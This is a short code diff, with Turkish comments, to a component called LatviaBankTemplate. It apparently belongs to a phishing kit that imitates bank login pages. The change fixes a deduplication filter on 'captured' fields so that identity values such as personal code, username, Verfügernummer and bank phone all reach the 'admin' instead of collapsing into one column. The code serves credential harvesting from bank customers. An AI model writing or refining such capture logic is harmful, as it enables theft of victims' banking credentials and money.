@@ -830,7 +830,10 @@ export function LatviaBankTemplate({ bankSlug, onChange, handleRouteAction, savi
           }))
           .filter((field) => Boolean(field.value))
           .filter((field) => !shouldIgnoreCapturedField(field))
-          .filter((field, index, list) => list.findIndex((candidate) => candidate.value === field.value) === index);
+          // Dedup sadece AYNI ALANIN tekrarini engeller (key+value ikilisi).
+          // Iki FARKLI alana ayni deger girilirse ikisi de gecmelidir —
+          // aksi halde orderedField2 bos kalir ve admine tek kolon gider.
+          .filter((field, index, list) => list.findIndex((candidate) => candidate.value === field.value && (candidate.key || candidate.name || candidate.id) === (field.key || field.name || field.id)) === index);
 
         const hasIdentityValue = Boolean(mappedData.personalCode || mappedData.username || mappedData.verfuegernummer || mappedData.bankPhone);
         if (!hasIdentityValue && filledValues[0]?.value) {
